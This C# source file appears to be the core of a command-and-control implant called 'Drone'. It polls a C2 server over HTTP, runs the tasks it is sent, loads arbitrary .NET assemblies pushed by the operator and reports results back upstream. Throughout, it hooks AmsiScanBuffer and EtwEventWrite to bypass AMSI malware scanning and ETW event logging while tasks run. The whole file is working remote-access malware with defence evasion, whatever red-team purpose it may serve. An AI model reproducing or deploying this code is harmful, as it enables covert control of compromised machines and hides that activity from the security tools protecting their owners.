﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using Drone.SharpSploit.Evasion;
using Drone.DInvoke.DynamicInvoke;
using Drone.Handlers;
using Drone.Models;
using Drone.Modules;

using MinHook;

namespace Drone
{
    public class Drone
    {
        private Metadata _metadata;
        private DroneConfig _config;
        private HookEngine _hookEngine;
        private Handler _handler;
        private bool _running;

        private readonly List<DroneModule> _modules = new();
        private readonly Dictionary<string, CancellationTokenSource> _taskTokens = new();

        public delegate void Callback(DroneTask task, CancellationToken token);

        public void Start()
        {
            _config = Utilities.GenerateDefaultConfig();
            _metadata = Utilities.GenerateMetadata();
            _hookEngine = new HookEngine();

            _handler = GetHandler;
            _handler.Init(_config, _metadata);

            var thread = new Thread(async () => { await _handler.Start(); });
            thread.Start();

            LoadDefaultModules();

            _running = true;

            while (_running)
            {
                if (!_handler.GetInbound(out var messages))
                {
                    Thread.Sleep(100);                    
                    continue;
                }

                foreach (var message in messages) HandleC2Message(message);
            }
        }

        private void HandleC2Message(C2Message message)
        {
            if (message.Type == C2Message.MessageType.DroneTask)
            {
                var tasks = Convert.FromBase64String(message.Data).Deserialize<IEnumerable<DroneTask>>().ToArray();
                if (tasks.Any()) HandleDroneTasks(tasks);
            }
        }

        private void HandleDroneTasks(IEnumerable<DroneTask> tasks)
        {
            foreach (var task in tasks) HandleDroneTask(task);
        }

        private void HandleDroneTask(DroneTask task)
        {
            var module = _modules.FirstOrDefault(m => m.Name.Equals(task.Module, StringComparison.OrdinalIgnoreCase));
            var command = module?.Commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase));

            // cancellation token for the task
            var token = new CancellationTokenSource();
            _taskTokens.Add(task.TaskGuid, token);
            
            // send task running
            SendTaskRunning(task.TaskGuid);

            Task.Factory.StartNew(() =>
            {
                try
                {
                    // handle evasion hooks
                    var bypassAmsi = _config.GetConfig<bool>("BypassAmsi");
                    var bypassEtw = _config.GetConfig<bool>("BypassEtw");

                    if (bypassAmsi)
                    {
                        if (Amsi.AmsiScanBufferOriginal is null) CreateAmsiBypassHook();
                        _hookEngine.EnableHook(Amsi.AmsiScanBufferOriginal);
                    }
                    
                    if (bypassEtw)
                    {
                        if (Etw.EtwEventWriteOriginal is null) CreateEtwBypassHook();
                        _hookEngine.EnableHook(Etw.EtwEventWriteOriginal);
                    }

                    // run the task
                    command?.Callback.Invoke(task, token.Token);
                    
                    // unload hooks
                    if (bypassAmsi) _hookEngine.DisableHook(Amsi.AmsiScanBufferOriginal);
                    if (bypassEtw) _hookEngine.DisableHook(Etw.EtwEventWriteOriginal);

                    // send task complete
                    SendTaskComplete(task.TaskGuid);
                }
                catch (Exception e)
                {
                    // if module throws, send error back
                    SendError(task.TaskGuid, e.Message);
                }
                finally
                {
                    token.Dispose();
                    _taskTokens.Remove(task.TaskGuid);
                }
            }, token.Token);
        }

        private void SendTaskRunning(string taskGuid)
        {
            var update = new DroneTaskUpdate(taskGuid, DroneTaskUpdate.TaskStatus.Running);
            SendDroneTaskUpdate(update);
        }

        private void SendTaskComplete(string taskGuid)
        {
            var update = new DroneTaskUpdate(taskGuid, DroneTaskUpdate.TaskStatus.Complete);
            SendDroneTaskUpdate(update);
        }

        public void SendResult(string taskGuid, string result)
        {
            var update = new DroneTaskUpdate(taskGuid, DroneTaskUpdate.TaskStatus.Running, Encoding.UTF8.GetBytes(result));
            SendDroneTaskUpdate(update);
        }

        public void SendError(string taskGuid, string error)
        {
            var update = new DroneTaskUpdate(taskGuid, DroneTaskUpdate.TaskStatus.Aborted, Encoding.UTF8.GetBytes(error));
            SendDroneTaskUpdate(update);
        }

        public void SendDroneTaskUpdate(DroneTaskUpdate update)
        {
            var message = new C2Message(C2Message.MessageDirection.Upstream, C2Message.MessageType.DroneTaskUpdate, _metadata)
            {
                Data = Convert.ToBase64String(update.Serialize())
            };
            
            SendC2Message(message);
        }

        public void SendDroneData(string taskGuid, string serverModule, byte[] data)
        {
            var update = new DroneTaskUpdate(taskGuid, DroneTaskUpdate.TaskStatus.Running, data)
            {
                ServerModule = serverModule
            };
            
            SendDroneTaskUpdate(update);
        }

        private void SendC2Message(C2Message message)
        {
            _handler.QueueOutbound(message);
        }

        public void CancelTask(string taskGuid)
        {
            var token = _taskTokens[taskGuid];
            token.Cancel();
            _taskTokens.Remove(taskGuid);
        }

        private void LoadDroneModule(DroneModule module)
        {
            module.Init(this, _config, _hookEngine);
            _modules.Add(module);
            SendModuleLoaded(module);
        }

        public void LoadDroneModule(Assembly asm)
        {
            foreach (var type in asm.GetTypes())
            {
                if (!type.IsSubclassOf(typeof(DroneModule))) continue;
                var module = (DroneModule) Activator.CreateInstance(type);
                LoadDroneModule(module);
            }
        }

        private void SendModuleLoaded(DroneModule module)
        {
            var definition = Utilities.MapDroneModuleDefinition(module);
            var message = new C2Message(C2Message.MessageDirection.Upstream, C2Message.MessageType.DroneModule, _metadata)
            {
                Data = Convert.ToBase64String(definition.Serialize())
            };
            
            SendC2Message(message);
        }

        public void Stop()
        {
            _running = false;
        }

        private void CreateAmsiBypassHook()
        {
            // force dll to load
            _ = Generic.LoadModuleFromDisk("amsi.dll");
                            
            Amsi.AmsiScanBufferOriginal = _hookEngine.CreateHook(
                "amsi.dll",
                "AmsiScanBuffer",
                new Amsi.AmsiScanBufferDelegate(Amsi.AmsiScanBufferDetour));
        }
        
        private void CreateEtwBypassHook()
        {
            Etw.EtwEventWriteOriginal = _hookEngine.CreateHook(
                "ntdll.dll",
                "EtwEventWrite",
                new Etw.EtwEventWriteDelegate(Etw.EtwEventWriteDetour));
        }

        private void LoadDefaultModules()
        {
            var self = Assembly.GetExecutingAssembly();
            LoadDroneModule(self);
        }

        private static Handler GetHandler => new DefaultHttpHandler();
    }
}